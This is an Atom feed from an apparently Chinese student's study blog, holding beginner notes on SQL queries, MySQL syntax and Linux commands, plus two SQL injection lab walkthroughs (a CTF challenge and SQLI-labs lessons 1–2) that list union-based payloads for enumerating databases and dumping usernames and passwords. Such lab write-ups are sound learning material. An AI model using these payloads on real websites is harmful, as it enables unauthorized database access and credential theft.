<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>春风少年郎的博客</title>
  
  <subtitle>众生如光影，吾辈皆旅人</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-11-08T11:49:00.224Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>春风语</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sql注入 post.1</title>
    <link href="http://example.com/2023/11/08/sql%E6%B3%A8%E5%85%A5-post-1/"/>
    <id>http://example.com/2023/11/08/sql%E6%B3%A8%E5%85%A5-post-1/</id>
    <published>2023-11-08T10:44:52.000Z</published>
    <updated>2023-11-08T11:49:00.224Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql注入-post-1"><a href="#sql注入-post-1" class="headerlink" title="sql注入 post.1"></a>sql注入 post.1</h1><p>1.先对表单输入账号及密码，用hackbar抓包，发现是host传参；</p><p>2.猜测输入语句（可以直接看源码）：</p><p><code>sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; AND password=&#39;$password&#39;&quot;;</code></p><p>对于初学者而言，了解源码结构是很有必要的</p><p>3.寻找注入点个数 ：</p><p>a. username参数必须正确，寻找username的正确值</p><p><code>username=1&#39; or 1=1 #&amp;password=123</code> </p><p>得出用户名为why</p><p>b. 寻找注入点个数</p><p><code>username=1&#39; order by 3 #&amp;password=123</code></p><p>从1试到3，取四的时候报错，得出三个点</p><p>4.寻找显示位(联合查询的前头必须是不存在的，错误的)</p><p><code>username=123&#39; union select 1, 2, 3 #&amp;password=123</code></p><p>‘2’  显示，判断2所在位置为显示位</p><p>5.爆库</p><p><code>username=123&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata #&amp;password=123</code></p><p>需要ez_sql</p><p>6.爆表</p><p><code>username=123&#39; union select 1,group_concat(table_name),3 from</code></p><p><code>information_schema.tables where table_schema=&#39;ez_sql&#39;#&amp;password=123</code></p><p>需要users</p><p>7.爆列</p><p><code>username=123&#39; union select 1,group_concat(column_name),3 from information_schema.columns where</code> </p><p><code>table_name=&#39;users&#39; #&amp;password=123</code></p><p>得出：id,username,password</p><p>8.爆值(不清楚哪个列没关系，全爆)</p><p><code>username=123&#39; union select 1,group_concat(id,username,password),3 from ez_sql.users#&amp;password=123</code></p><p>得出flag：<code>ROIS&#123;sqli_1s_in7ere5tingwaku&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sql注入-post-1&quot;&gt;&lt;a href=&quot;#sql注入-post-1&quot; class=&quot;headerlink&quot; title=&quot;sql注入 post.1&quot;&gt;&lt;/a&gt;sql注入 post.1&lt;/h1&gt;&lt;p&gt;1.先对表单输入账号及密码，用hackbar抓包，发现是ho</summary>
      
    
    
    
    
    <category term="post" scheme="http://example.com/tags/post/"/>
    
  </entry>
  
  <entry>
    <title>SQLI_lab.less.1andless.2</title>
    <link href="http://example.com/2023/11/05/SQLI-lab-less-1andless-2/"/>
    <id>http://example.com/2023/11/05/SQLI-lab-less-1andless-2/</id>
    <published>2023-11-05T07:12:00.000Z</published>
    <updated>2023-11-08T08:35:32.409Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-整值型注入"><a href="#一-整值型注入" class="headerlink" title="一. 整值型注入"></a>一. 整值型注入</h1><p>1.判断注入点类型</p><ol><li><code>id=1</code>      页面回显正常</li><li><code>id=1&#39;&#39;</code>    报错</li></ol><p>由以上可知：该注入点为整值型注入点</p><p>2.确认列数</p><p>采用order by方法：</p><p><code>?id=1 order by 1</code>页面回显正常</p><p><code>?id=1 order by 2</code>页面回显正常</p><p><code>?id=1 order by 3</code>页面回显正常</p><p><code>?id=1 order by 4</code>页面回显不正常：Unknown column ‘4’ in ‘order clause’</p><p>由以上可知：有四列</p><p>3.查询显示位（使用union select）</p><p>不是所有列都能显示，但我们需要显示位，所以2、3两步缺一不可。</p><p><code>?id=-1 union select 1,2,3</code></p><p>当id值不存在时，方有我们想要的回显，所以id&#x3D;-1;</p><p>页面回显</p><p>​Welcome  Dhakkan<br>​Your Login name:2<br>​Your Password:3</p><p>由以上可知：显示位有两个</p><p>4.爆数据</p><p>a. 爆所有数据库名：</p><p><code>?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata --+</code> </p><p>b. 爆所有表名：</p><p><code>?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where schema.schema=&#39;goal-database&#39; --+</code></p><p>c.爆所有列名：</p><p><code>?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;goal-table&#39; --+</code></p><p>d.爆所有数据：</p><p><code>?id=-1 union select 1, group_concat_group(goal-column),3 from goal-database.goal-table --+</code> </p><p>小结：</p><ul><li>这种方法有很好的普遍性</li><li>goal-database：目标数据库名字；goal-table：目标表名；goal-column：目标列名</li><li>注释为   空格–+空格 </li><li>注释不能省略，你无法确定其背后的语句在拼接之后是否语法正确</li></ul><h1 id="二-字符串型注入"><a href="#二-字符串型注入" class="headerlink" title="二. 字符串型注入"></a>二. 字符串型注入</h1><p>1.判断注入点类型</p><ol><li><code>id=1</code>页面回显正常</li><li><code>id=1&#39;&#39;</code>       页面回显正常</li></ol><p>由以上可知：该注入点为字符串型注入点</p><p>2之后一切类似，但注意id&#x3D;1’或id&#x3D;-1’，这里是需要补一个单引号的，至于注释，这两种方法都要，别嫌麻烦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-整值型注入&quot;&gt;&lt;a href=&quot;#一-整值型注入&quot; class=&quot;headerlink&quot; title=&quot;一. 整值型注入&quot;&gt;&lt;/a&gt;一. 整值型注入&lt;/h1&gt;&lt;p&gt;1.判断注入点类型&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;id=1&lt;/code&gt;      页面</summary>
      
    
    
    
    <category term="SQLI_lab" scheme="http://example.com/categories/SQLI-lab/"/>
    
    
    <category term="字符串型及整值型注入" scheme="http://example.com/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9E%8B%E5%8F%8A%E6%95%B4%E5%80%BC%E5%9E%8B%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL笔记1.0查询</title>
    <link href="http://example.com/2023/10/29/SQL%E7%AC%94%E8%AE%B01-0%E6%9F%A5%E8%AF%A2/"/>
    <id>http://example.com/2023/10/29/SQL%E7%AC%94%E8%AE%B01-0%E6%9F%A5%E8%AF%A2/</id>
    <published>2023-10-29T10:55:35.000Z</published>
    <updated>2023-10-29T10:58:31.836Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL笔记-1-0-查询"><a href="#SQL笔记-1-0-查询" class="headerlink" title="SQL笔记 1.0.查询"></a>SQL笔记 1.0.查询</h1><h2 id="一：基本（关键字必须大写，用分号结束）"><a href="#一：基本（关键字必须大写，用分号结束）" class="headerlink" title="一：基本（关键字必须大写，用分号结束）"></a>一：基本（关键字必须大写，用分号结束）</h2><p>1: EXLECT  &lt;列，*表全部&gt; FROM &lt;表格名&gt; WHERE &lt;条件&gt;;</p><p>​        A                    B                 C            D           F           E</p><p>B：eg：score  point  解释：引用时将score改名为point</p><h2 id="二：排序"><a href="#二：排序" class="headerlink" title="二：排序"></a>二：排序</h2><p><code>1.eg：EXLECT  *  FROM students WHERE num=2  ORDER  BY  gender;</code></p><p><code>2.eg：EXLECT  *  FROM students  WHERE num=2  ORDER  BY  gender  DESC;</code></p><p><code>3.eg：EXLECT  *  FROM students  WHERE num=2  ORDER  BY  gender  DESC  ，score</code>；</p><p>解释：1.ORDER BY  : 排序；若加上DESC,表倒序；在逗号，表次级排序</p><p>小结，用一个例子：</p><p>SELECT id, name, gender, score<br>FROM students<br>WHERE class_id&#x3D;1<br>ORDER BY score DESC;</p><h2 id="三：分页查询"><a href="#三：分页查询" class="headerlink" title="三：分页查询"></a>三：分页查询</h2><p>1.eg：</p><p><code>SELECT id, name, gender, score</code><br><code>FROM students</code><br><code>ORDER BY score DESC</code><br><code>LIMIT 3 OFFSET 0;</code></p><p>解读：1.本指令没有 WHERE </p><p>​           2.LIMIT：表示一次最多拿几条；OFFSET：设想要从第n条开始看，OFFSET 后面的数字为n-1</p><p>小结：</p><p>​          使用<code>LIMIT &lt;M&gt; OFFSET &lt;N&gt;</code>可以对结果集进行分页，每次查询返回结果集的一部分；</p><p>​          分页查询需要先确定每页的数量和当前页数，然后确定<code>LIMIT</code>和<code>OFFSET</code>的值。</p><h2 id="四：聚合查询"><a href="#四：聚合查询" class="headerlink" title="四：聚合查询"></a>四：聚合查询</h2><p>1.eg：<code>SELECT COUNT(*) boys FROM students WHERE gender = &#39;M&#39;;</code></p><p>解读：1.COUNT：统计条数</p><p>附：还有其他的聚合函数：</p><p>SUM（）：计算某一列的合计值，该列必须为数值类型；</p><p>AVG（）：计算某一列的平均值，该列必须为数值类型；</p><p>MAX（）：计算某一列的最大值；</p><p>MIN（）：计算某一列的最小值；</p><p>提醒：1.<code>MAX()</code>和<code>MIN()</code>函数并不限于数值类型。如果是字符类型，<code>MAX()</code>和<code>MIN()</code>会返回排序最后和排序最前的字符。</p><p>​           2.如果聚合查询的<code>WHERE</code>条件没有匹配到任何行，<code>COUNT()</code>会返回0，而<code>SUM()</code>、<code>AVG()</code>、<code>MAX()</code>和<code>MIN()</code>会返回<code>NULL</code></p><ul><li><h3 id="提升：每页3条记录，如何通过聚合查询获得总页数？"><a href="#提升：每页3条记录，如何通过聚合查询获得总页数？" class="headerlink" title="提升：每页3条记录，如何通过聚合查询获得总页数？"></a>提升：每页3条记录，如何通过聚合查询获得总页数？</h3></li><li><p>SELECT CEILING(COUNT(*)&#x2F;3) FROM students；</p></li></ul><h3 id="接四："><a href="#接四：" class="headerlink" title="接四："></a>接四：</h3><p><code>2.eg：SELECT COUNT(*) num FROM students GROUP BY class_id;</code></p><p><code>3.eg：SELECT class_id, COUNT(*) num FROM students GROUP BY class_id;</code></p><p>解读：1.GROUP BY：分组指令</p><p>​           2.SELECT class_id, COUNT(*)：将class_id一一列出来</p><p>如图：</p><table><thead><tr><th align="left">class_id</th><th align="left">num</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">4</td></tr><tr><td align="left">2</td><td align="left">3</td></tr><tr><td align="left">3</td><td align="left">3</td></tr></tbody></table><h2 id="五：多表查询"><a href="#五：多表查询" class="headerlink" title="五：多表查询"></a>五：多表查询</h2><p>1.eg:</p><p><code>SELECT s.id, s.name, s.class_id, c.name class_name, s.gender, s.score</code><br><code>FROM students s</code><br><code>INNER JOIN classes c</code><br><code>ON s.class_id = c.id;</code></p><p>解读：students s：后面的s是别名，简化表格；</p><p>​           INNER JOIN：属于连接查询，最常用的一种内连接——INNER JOIN；</p><p>​           ON：建立两列联系；</p><p> <em>下面摘一段原文：</em></p><p>注意INNER JOIN查询的写法是：</p><ol><li>先确定主表，仍然使用<code>FROM &lt;表1&gt;</code>的语法；</li><li>再确定需要连接的表，使用<code>INNER JOIN &lt;表2&gt;</code>的语法；</li><li>然后确定连接条件，使用<code>ON &lt;条件...&gt;</code>，这里的条件是<code>s.class_id = c.id</code>，表示<code>students</code>表的<code>class_id</code>列与<code>classes</code>表的<code>id</code>列相同的行需要连接；</li><li>可选：加上<code>WHERE</code>子句、<code>ORDER BY</code>等子句。</li></ol><p>使用别名不是必须的，但可以更好地简化查询语句。</p><h3 id="接五："><a href="#接五：" class="headerlink" title="接五："></a>接五：</h3><p>有内连接，就有外连接，全连接，我将大量引用原文：（可认为左表为主表，右表为副表）</p><p>我们把tableA看作左表，把tableB看成右表，那么INNER JOIN是选出两张表都存在的记录：</p><p><img src="/./SQL%E7%AC%94%E8%AE%B01-0%E6%9F%A5%E8%AF%A2/l.png" alt="inner-join"></p><p>LEFT OUTER JOIN是选出左表存在的记录：</p><p><img src="/./SQL%E7%AC%94%E8%AE%B01-0%E6%9F%A5%E8%AF%A2/l-1698577027841-1.png" alt="left-outer-join"></p><p>RIGHT OUTER JOIN是选出右表存在的记录：</p><p><img src="/./SQL%E7%AC%94%E8%AE%B01-0%E6%9F%A5%E8%AF%A2/l-1698577027841-2.png" alt="right-outer-join"></p><p>FULL OUTER JOIN则是选出左右表都存在的记录：无图</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>JOIN查询需要先确定主表，然后把另一个表的数据“附加”到结果集上；</p><p>INNER JOIN是最常用的一种JOIN查询，它的语法是<code>SELECT ... FROM &lt;表1&gt; INNER JOIN &lt;表2&gt; ON &lt;条件...&gt;</code>；</p><p>JOIN查询仍然可以使用<code>WHERE</code>条件和<code>ORDER BY</code>排序。</p><p>总结：“查询”写完了，总体没难度。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQL笔记-1-0-查询&quot;&gt;&lt;a href=&quot;#SQL笔记-1-0-查询&quot; class=&quot;headerlink&quot; title=&quot;SQL笔记 1.0.查询&quot;&gt;&lt;/a&gt;SQL笔记 1.0.查询&lt;/h1&gt;&lt;h2 id=&quot;一：基本（关键字必须大写，用分号结束）&quot;&gt;&lt;a h</summary>
      
    
    
    
    <category term="MySQL" scheme="http://example.com/categories/MySQL/"/>
    
    
    <category term="概述" scheme="http://example.com/tags/%E6%A6%82%E8%BF%B0/"/>
    
  </entry>
  
  <entry>
    <title>vmware基本操作1.0</title>
    <link href="http://example.com/2023/10/29/vmware%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C1-0/"/>
    <id>http://example.com/2023/10/29/vmware%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C1-0/</id>
    <published>2023-10-29T10:52:50.000Z</published>
    <updated>2023-10-29T12:57:13.085Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vmware基本操作1-0"><a href="#vmware基本操作1-0" class="headerlink" title="vmware基本操作1.0"></a>vmware基本操作1.0</h1><h2 id="一-账户"><a href="#一-账户" class="headerlink" title="一. 账户"></a>一. 账户</h2><p>1.创建账户：  sudo useradd -m name(用户)</p><p>2.修改用户密码：sudo passwd name(用户)</p><p>3.删除用户：sudo userdel name(用户)</p><h2 id="二-目录"><a href="#二-目录" class="headerlink" title="二. 目录"></a>二. 目录</h2><h3 id="1-change-directory-切换目录"><a href="#1-change-directory-切换目录" class="headerlink" title="1.change directory  切换目录"></a>1.change directory  切换目录</h3><p>cd ~&#x2F;······                                相对路径</p><p>cd &#x2F;home&#x2F;name(用户)&#x2F;······    绝对路径</p><p>附：~   ：代表当前用户的主目录；    ·  ：代表当前目录；  ··   ：代表上一级目录</p><h3 id="2-list-罗列目录"><a href="#2-list-罗列目录" class="headerlink" title="2.list    罗列目录"></a>2.list    罗列目录</h3><p>ls ~  ：列出主目录下的所有项<br>ls ·&#x2F;ef ：列出当前目录下的ef文件</p><h3 id="3-print-working-directory-显示当前工作目录"><a href="#3-print-working-directory-显示当前工作目录" class="headerlink" title="3.print working directory 显示当前工作目录"></a>3.print working directory 显示当前工作目录</h3><p>pwd </p><h3 id="4-make-directory-创建目录"><a href="#4-make-directory-创建目录" class="headerlink" title="4.make directory  创建目录"></a>4.make directory  创建目录</h3><p>mkdir abcd      默认在~里</p><p>mkdir -p ~&#x2F;a&#x2F;b&#x2F;c    建立了一系列目录</p><p>附：-p ：可以将路径的层次目录全部建立</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vmware基本操作1-0&quot;&gt;&lt;a href=&quot;#vmware基本操作1-0&quot; class=&quot;headerlink&quot; title=&quot;vmware基本操作1.0&quot;&gt;&lt;/a&gt;vmware基本操作1.0&lt;/h1&gt;&lt;h2 id=&quot;一-账户&quot;&gt;&lt;a href=&quot;#一-账户&quot;</summary>
      
    
    
    
    <category term="VMware" scheme="http://example.com/categories/VMware/"/>
    
    
    <category term="概述" scheme="http://example.com/tags/%E6%A6%82%E8%BF%B0/"/>
    
  </entry>
  
  <entry>
    <title>MySQL</title>
    <link href="http://example.com/2023/10/28/MySQL/"/>
    <id>http://example.com/2023/10/28/MySQL/</id>
    <published>2023-10-28T12:27:40.000Z</published>
    <updated>2023-10-29T05:04:14.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MySQL总结之基，查，增，删，改"><a href="#MySQL总结之基，查，增，删，改" class="headerlink" title="MySQL总结之基，查，增，删，改"></a>MySQL总结之基，查，增，删，改</h1><h2 id="一-基础"><a href="#一-基础" class="headerlink" title="一.  基础"></a>一.  基础</h2><ol><li>登入：     <code>win+r =&gt; cmd =&gt; mysql -u root -r =&gt; 回车  或   win+r =&gt; cmd =&gt; mysql -u root -p =&gt; 回车回车</code></li></ol><h2 id="二-查询"><a href="#二-查询" class="headerlink" title="二. 查询"></a>二. 查询</h2><h3 id="1-数据库及数据表"><a href="#1-数据库及数据表" class="headerlink" title="1.数据库及数据表"></a>1.数据库及数据表</h3><p>查询所有数据库</p><p><code>show database;</code></p><p>b.查询当前数据库</p><p>select database();</p><p>c.查询当前数据库的所有表</p><p><code>show tables;</code></p><p>d.查看一个表的结构</p><p><code>desc name(表名)</code></p><h3 id="2-数据本身"><a href="#2-数据本身" class="headerlink" title="2.数据本身"></a>2.数据本身</h3><h4 id="1-查询的结构"><a href="#1-查询的结构" class="headerlink" title="1.查询的结构"></a>1.查询的结构</h4><p><code>select</code> </p><p><code>······</code></p><p><code>from</code></p><p><code>······</code></p><p><code>where</code></p><p><code>······</code></p><p><code>group by</code></p><p><code>······</code></p><p><code>having</code></p><p><code>······</code></p><p><code>order by</code></p><p><code>······</code></p><p>关键字顺序不能错</p><h4 id="2-运行逻辑"><a href="#2-运行逻辑" class="headerlink" title="2.运行逻辑"></a>2.运行逻辑</h4><p>from                          从某张表中查询数据</p><p>where                        先经过where条件筛选出有价值的数据</p><p>groub by                    对这些有价值的数据进行分组</p><p>having                       分组之后可以使用having继续筛选</p><p>select                        select查询出来</p><p>order by                    最后排序输出</p><h4 id="3-查询类型及细节"><a href="#3-查询类型及细节" class="headerlink" title="3.查询类型及细节"></a>3.查询类型及细节</h4><h5 id="a-排序"><a href="#a-排序" class="headerlink" title="a. 排序"></a>a. 排序</h5><p>正常情况下为升序，desc 调整后为降序</p><p>如：eg：<code>SELECT  *  FROM students  WHERE num=2  ORDER  BY  gender  DESC;</code>    （大小写不敏感）</p><p>多重排序：如：<code>SELECT  *  FROM students  WHERE num=2  ORDER  BY  gender  DESC  ，score；</code>  逗号后面的为次级排序</p><h5 id="b-分组"><a href="#b-分组" class="headerlink" title="b. 分组"></a>b. 分组</h5><p>模板</p><p>​                      <code>select</code><br><code>​...</code><br>                  <code>from​</code></p><p>​<code>...​</code></p><p>​             <code>group by​</code></p><p>​     &#96;…&#96;&#96;</p><p>细节1：为什么分组函数不能直接使用在where后面？<br>因为分组函数在使用的时候必须先分组之后才能使用。<br>where执行的时候，还没有分组。所以where后面不能出现分组函数。（前面讲了逻辑顺序）</p><p>细节2：针对2. 的过滤 having</p><p><code>select name1, name2 from name(表名) group by name2 having name2&gt;a;</code></p><p>使用having可以对分完组之后的数据进一步过滤。<br>    having不能单独使用，having不能代替where，having必须<br>    和group by联合使用</p><p>优化策略：<br>where和having，优先选择where，where实在完成不了了，再选择having。</p><p>细节3：</p><p>多分组</p><p><code>select name1 name2 from name(表名) group by name1, name2;</code></p><p>具体会细分到 name2</p><h5 id="c-起别名"><a href="#c-起别名" class="headerlink" title="c. 起别名"></a>c. 起别名</h5><p>a. <code>select name1 name2 from name(表名)；</code></p><p>b. <code>select name1 as name2 from name(表名)；</code></p><h5 id="d-别名带空格或中文"><a href="#d-别名带空格或中文" class="headerlink" title="d. 别名带空格或中文"></a>d. 别名带空格或中文</h5><p><code>select name1 &#39;name    2&#39;  from name(表名);</code></p><p>单引号和双引号都可以，但在标准中，字符串（包括中文）应该用单引号。</p><h5 id="e-字段使用数学表达式"><a href="#e-字段使用数学表达式" class="headerlink" title="e. 字段使用数学表达式"></a>e. 字段使用数学表达式</h5><p>查询时允许字段使用数学表达式（加减乘除运算）</p><p><code>select name, m.sal*12 y.sal from name(表名);</code></p><p>   m.money*12 带有计算，将会输出结果。</p><h5 id="f-条件查询"><a href="#f-条件查询" class="headerlink" title="f.   条件查询"></a>f.   条件查询</h5><p>不等于 的两种表示</p><p>a. <code>select name from name(表名) where a != b;</code></p><p>b. <code>select name from name(表名) where a &lt;&gt; b;</code></p><p>不等于：&lt;&gt;  或  !&#x3D; </p><p>A. beteen and 的用法（遵循左小右大原则，即a小b大）</p><p><code> select name from name(表名) where sal between a and b;</code></p><p>B.  null 及 not null 的用法</p><p><code>select name from name(表名) where sal is null;</code></p><p>C. and or 优先级</p><p>and 优先级大于 or ，但可以用小括号来加强优先级，这一点与C语言一致。</p><p>D. in 与 not in 的用法(in 下面两个效果一致)</p><p><code>select * from name(表名) where x = a or x= b;</code></p><p><code>select * from name(表名) where x in(b,c);</code></p><p>in 不是区间，而是具体的值。与之对立的是 not in</p><p><code>select * from name(表名) where x not in(b,c);</code></p><p>查询不是a&#x3D;b及a&#x3D;c的数据。</p><h5 id="g-模糊查询"><a href="#g-模糊查询" class="headerlink" title="g. 模糊查询"></a>g. 模糊查询</h5><p>% 匹配多个字符(以下先代码后解释)</p><p><code>select name from name(表名) where name1 like &#39;%o%&#39;;</code></p><p>找到名字里含有%o%的</p><p><code>select name from name(表名) where name1 like &#39;o%&#39;;</code></p><p>找到名字里以o开头的</p><p><code>select name from name(表名) where name1 like &#39;%o&#39;;</code></p><p>找到名字里以o结尾的</p><p>_ 匹配单个字符(以下先代码后解释)</p><p><code>select * from name(表名) where name1 like &#39;_A%&#39;;</code></p><p>找到第二个字母是A的</p><p>如果前面有n个字符，便在A前面输入n个下划线</p><p>转义</p><p><code>select * from name(表名) where name1 like &#39;% \ _%&#39;;</code></p><p>真实输入中%与\与_之间没有空格，本处为了显示 \ 故做特殊处理</p><p>% 和 \ 有特殊含义，为了正常显示下划线，采用转义方法，该处与C语言类似</p><h5 id="h-去重-distinct"><a href="#h-去重-distinct" class="headerlink" title="h.去重  distinct"></a>h.去重  distinct</h5><p>select distinct name1 name2 name3 ······ from name(表名)</p><p>distinct 应放在所有字段的前面，后面所有字段一起合理去重</p><h4 id="4-单表函数"><a href="#4-单表函数" class="headerlink" title="4.单表函数"></a>4.单表函数</h4><h5 id="单行处理函数"><a href="#单行处理函数" class="headerlink" title="单行处理函数"></a>单行处理函数</h5><p>lower 转换小写</p><p>select  &#96;</p><p><code>lower(name1)  name2 </code></p><p><code>from</code> </p><p><code> name(表名);</code> </p><p>二. upper 转换大写</p><p><code>select </code></p><p><code> upper(name1)  name2</code> </p><p><code> from </code>  </p><p><code>name(表名);</code> </p><p>三. substr 取子串（substr( 被截取的字符串, 起始下标,截取的长度)）</p><p><code>select </code></p><p><code>substr(name1,n,m) name2</code></p><p><code> from</code> </p><p><code> name(表名);</code></p><p>n&gt;&#x3D;1, m&gt;&#x3D;1；name1 是列名。</p><p>附带例子：</p><p>找出员工名字第一个字母是A的员工信息？</p><p>第一种方式：模糊查询</p><p><code>select</code></p><p> ename&#96; </p><p><code>from</code> </p><p><code>emp</code></p><p><code> where</code> </p><p><code> ename like &#39;A%&#39;;</code></p><p>第二种方式：substr函数</p><p><code>select</code></p><p><code>ename</code> </p><p><code>from</code></p><p><code>emp</code> </p><p><code>where </code></p><p><code>substr(ename,1,1) = &#39;A&#39;;</code></p><p>拓展例子：</p><p>实现首字母大写</p><p><code>select</code></p><p><code> concat(upper(substr(name,1,1)),substr(name,2,length(name) - 1)) as result</code> </p><p><code> from</code> </p><p><code> t_student;</code></p><p>补充：concat ：进行字符串的拼接</p><p><code>select </code></p><p><code> concat  (name1,name2) name3</code> </p><p><code> from</code> </p><p><code>  name(表名);</code></p><p>四. length 取长度</p><p><code>select</code></p><p><code>  length(name)  lengthname</code>  </p><p><code>  from</code>  </p><p><code> name(表名);</code> </p><p>五. trim 去空格 </p><p><code>select</code> </p><p><code>trim(&#39;             A&#39;)</code></p><p><code>from</code> </p><p><code>name(表名)；</code></p><p>查询带 A 的数据</p><p>六. round 四舍五入</p><ol><li><p>先介绍 select 后面可以跟字面量&#x2F;字面值（1000等），也可以跟字符串，但是无论如何，都将把数据同化成它。</p></li><li><p>a.  <code>select</code></p><p>​     <code>round(1234.567,0) name1</code></p><p>​     <code>from</code></p><p>​     <code>name(表名);</code></p><p><code>b.  select</code></p><p>​     <code>round(1234.567,1) name1</code></p><p>​     <code>from</code></p><p>​     <code>name(表名);</code></p><p><code>c.  select</code></p><p>​     <code>round(1234.567,-1) name1</code></p><p>​     <code>from</code></p><p>​     <code>name(表名</code>);</p></li></ol><p>a. 数据是：1234；b. 数据是：1234.6；c. 数据是：1240</p><p>round(a,n) 中 a 为被四舍五入的数据，n为保留到小数点后几位，n&lt;0 即为整数位四舍五入</p><p>六. rand() 生成随机数</p><p>select</p><p>rand()</p><p>from</p><p>emp;</p><p>七. ifnull 将 null 转换成一个具体值</p><p>ifnull是空处理函数。专门处理空的。在所有数据库当中，只要有NULL参与的数学运算，最终结果就是NULL。</p><p>select </p><p>sal + ifnull(comm,0)*12</p><p>from </p><p>name(表名);</p><p>ifnull (data,n) ：data 为被处理的数据，n为若数据为null，视其为n</p><h5 id="多行处理函数"><a href="#多行处理函数" class="headerlink" title="多行处理函数"></a>多行处理函数</h5><p>多行处理函数种类</p><p>​                                          count计数<br>​                          sum求和<br>​                          avg平均值<br>​                          max最大值<br>​                          min最小值</p><p>注意事项</p><ol><li>特点：输入多行，输出一行。</li><li>先对数据分组，再使用分组函数。若没有对数据分组，默认整张表为一组。</li><li>分组函数自动忽略 NULL ，不需要对 NULL 提前处理。</li><li>分组函数中count(*)和count(具体字段)有什么区别，区别在于 NULL 是否影响计算。解释如下：</li></ol><p>count(具体字段)：表示统计该字段下所有不为NULL的元素的总数。</p><p>count(*)：统计表当中的总行数。</p><p>因为每一行记录不可能都为NULL，一行数据中有一列不为NULL，则这行数据就是有效的。</p><ol start="5"><li>分组函数不能够直接使用在where子句中。</li><li>所有的分组函数可以组合起来一起用。</li></ol><h2 id="三-增加"><a href="#三-增加" class="headerlink" title="三. 增加"></a>三. 增加</h2><h3 id="1-数据库及数据表-1"><a href="#1-数据库及数据表-1" class="headerlink" title="1.数据库及数据表"></a>1.数据库及数据表</h3><ol><li><p>建立数据库： <code>create database name(库名);</code></p></li><li><p>建立数据表：<code> create table name (</code></p><p><code>name1 bigint(n) not null auto_increment,</code></p><p><code>name2 varchar(100) not null,</code></p><p><code>······</code></p><p><code>namex name(数据形式)(y) not null,</code></p><p><code>primary key(name1)     )</code></p><p> <code>ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8</code></p><p>解释：auto_increment  ：自主增键；ENGINE&#x3D;InnoDB  ：MySQL的数据库引擎之一；DEFAULT CHARSET&#x3D;utf8：一种编码方式。</p></li></ol><h3 id="2-数据本身-1"><a href="#2-数据本身-1" class="headerlink" title="2.数据本身"></a>2.数据本身</h3><p>INSERT（添加数据）</p><p>INSERT语法：</p><p><code>INSERT INTO &lt;表名&gt; (字段1, 字段2, ...) VALUES (值1, 值2, ...);</code></p><p>巧记：UPDATE  SET   WHERE;</p><h2 id="四-删除"><a href="#四-删除" class="headerlink" title="四. 删除"></a>四. 删除</h2><h3 id="1-数据库及数据表-2"><a href="#1-数据库及数据表-2" class="headerlink" title="1.数据库及数据表"></a>1.数据库及数据表</h3><p>删除数据库</p><p><code>drop database if exists name(库名);</code></p><p>删除数据表</p><p><code>drop table if exists name(表名);</code></p><h3 id="2-数据本身-2"><a href="#2-数据本身-2" class="headerlink" title="2.数据本身"></a>2.数据本身</h3><p>DELETE语法：</p><p><code>DELETE FROM &lt;表名&gt; WHERE ...;</code></p><p>解读：</p><p>WHERE：本语法的核心就在于 WHERE , 其有很大的操作空间，如 UPDATE。</p><p>巧记：DELETE  FROM   WHERE;</p><h2 id="五-改变"><a href="#五-改变" class="headerlink" title="五. 改变"></a>五. 改变</h2><h3 id="1-数据库及数据表-3"><a href="#1-数据库及数据表-3" class="headerlink" title="1.数据库及数据表"></a>1.数据库及数据表</h3><p>数据表：</p><p>提醒(无特殊说明时，name即是表名)</p><p>   <code>alter table name rename to newname;</code></p><p>(改表名)</p><p>a<code>lter table name character set 字符集名称;</code>  </p><p>(修改表的字符集)</p><p><code>alter table name add name(列名) 数据类型;</code>   </p><p>(添加一列)   </p><p><code>alter table name change name(列名) newname(新列别) 新数据类型;</code>   </p><p>(修改列名称 类型1)</p><p><code>alter table name modify name(列名) 新数据类型;</code> </p><p>(修改列名称 类型2)</p><p><code>alter table name drop name(列名)</code></p><h3 id="2-数据本身-3"><a href="#2-数据本身-3" class="headerlink" title="2.数据本身"></a>2.数据本身</h3><p>UPDATE语法：</p><p><code>UPDATE &lt;表名&gt; SET 字段1=值1, 字段2=值2, ... WHERE ...;</code></p><p>解读：</p><p>WHERE后面有很大的操作空间，不做赘叙，如：id&gt;&#x3D;5   AND   id&lt;&#x3D; 7UPDATE</p><p>巧记：UPDATE  SET   WHERE;</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MySQL总结之基，查，增，删，改&quot;&gt;&lt;a href=&quot;#MySQL总结之基，查，增，删，改&quot; class=&quot;headerlink&quot; title=&quot;MySQL总结之基，查，增，删，改&quot;&gt;&lt;/a&gt;MySQL总结之基，查，增，删，改&lt;/h1&gt;&lt;h2 id=&quot;一-基础&quot;</summary>
      
    
    
    
    <category term="MySQL" scheme="http://example.com/categories/MySQL/"/>
    
    
    <category term="一篇就够了" scheme="http://example.com/tags/%E4%B8%80%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/"/>
    
  </entry>
  
  <entry>
